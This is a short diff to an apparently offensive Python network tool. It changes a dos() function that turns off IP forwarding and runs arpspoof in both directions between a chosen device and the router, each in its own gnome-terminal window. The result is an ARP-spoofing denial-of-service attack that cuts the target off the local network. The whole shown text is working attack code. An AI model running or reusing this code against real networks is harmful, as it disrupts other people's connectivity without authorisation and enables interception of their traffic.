@@ -86,13 +86,13 @@ def dos():
     os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
     print('')
 
-    spoof_router = ('arpspoof -i ' + network_interface +
-                    ' -t ' + device + ' -r ' + router)
-    os.system(f'gnome-terminal -- bash -c "{spoof_router} && read"')
+    spoof_router = ('arpspoof -i ' + network_interface + ' -t ' + device + ' -r ' + router)
+    #os.system(f'gnome-terminal -- bash -c "{spoof_router} && read"')
+    os.system("gnome-terminal -e 'bash -c \"" + spoof_router + "; exec bash\"'")
 
-    spoof_device = ('arpspoof -i ' + network_interface +
-                    ' -t ' + router + ' -r ' + device)
-    os.system(f'gnome-terminal -- bash -c "{spoof_device} && read"')
+    spoof_device = ('arpspoof -i ' + network_interface + ' -t ' + router + ' -r ' + device)
+    #os.system(f'gnome-terminal -- bash -c "{spoof_device} && read"')
+    os.system("gnome-terminal -e 'bash -c \"" + spoof_device + "; exec bash\"'")
 
 
 # OPTIONS
